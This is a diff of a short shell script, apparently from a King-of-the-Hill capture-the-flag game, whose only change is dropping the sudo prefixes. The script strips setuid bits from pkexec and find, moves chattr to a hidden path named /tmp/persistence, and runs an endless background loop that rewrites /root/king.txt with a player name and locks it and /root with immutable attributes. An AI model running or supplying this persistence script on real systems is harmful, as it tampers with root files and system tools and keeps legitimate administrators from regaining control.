@@ -1,10 +1,10 @@
-sudo chmod -s /usr/bin/pkexec
-sudo chmod -s $(which find)
-sudo mv $(which chattr) /tmp/persistence
+chmod -s /usr/bin/pkexec
+chmod -s $(which find)
+mv $(which chattr) /tmp/persistence
 while true; do
-    sudo /tmp/persistence -ia /root
-    sudo /tmp/persistence -ia /root/king.txt 2>/dev/null
-    sudo echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
-    sudo /tmp/persistence +ia /root/king.txt 2>/dev/null
-    sudo /tmp/persistence +ia /root
+     /tmp/persistence -ia /root
+     /tmp/persistence -ia /root/king.txt 2>/dev/null
+     echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
+     /tmp/persistence +ia /root/king.txt 2>/dev/null
+     /tmp/persistence +ia /root
 done &
